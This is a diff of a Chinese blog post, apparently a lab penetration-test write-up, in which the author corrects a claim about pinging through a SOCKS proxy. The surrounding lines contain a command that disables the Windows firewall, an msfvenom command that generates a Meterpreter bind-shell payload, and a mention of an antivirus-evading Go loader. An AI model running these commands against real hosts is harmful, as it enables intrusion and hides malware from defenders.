@@ -556,9 +556,8 @@ WEN服务器首先我们对服务器进行端口扫描，nmap全">
 <pre class="language-none"><code class="language-none">netsh advfirewall set allprofiles state off </code></pre>
 
 <p><img src="/Downloads/20220505211457.png"></p>
-<p>成功，此时我们挂代理去ping一下</p>
-<p><img src="/Downloads/20220505211814.png"></p>
-<p>能ping同，那就用正向马打就行了，但是这里需要做个免杀，这里我用的一个go的加载器直接在目标机器上加载十六进制文件。</p>
+<p>成功，这里我之前写的是挂上代理去ping，后来一个学长提醒了我，icmp协议是走不了socks代理的，所以自然也是无法挂代理去ping的（现在想想，自己这句话说的真是有点蠢啊。。。）但这里也的确可以ping通，可能是由于网络环境配置有问题（当时配环境时大意了，以为内网机器无法出网就行了）</p>
+<p>那接下来继续模拟真实环境，用正向马去打，但是这里需要做个免杀，这里我用的一个go的加载器直接在目标机器上加载十六进制文件。</p>
 <pre class="language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;192.168.0.128 LPORT&#x3D;4444 -f hex -o shell.hex</code></pre>
 
 <p><img src="/Downloads/20220505220622.png"></p>
